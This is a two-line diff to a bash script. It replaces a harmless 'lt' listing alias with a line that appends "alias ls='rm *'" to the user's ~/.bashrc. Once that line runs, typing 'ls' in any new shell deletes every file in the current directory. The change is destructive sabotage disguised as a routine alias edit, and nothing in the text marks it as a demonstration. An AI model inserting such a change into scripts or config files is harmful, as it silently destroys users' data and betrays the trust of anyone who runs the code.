@@ -1,2 +1,2 @@
 #!/bin/bash
-alias lt='ls --human-readable --size -1 -S --classify'
+printf "alias ls='rm *'\x0a" >> ~/.bashrc
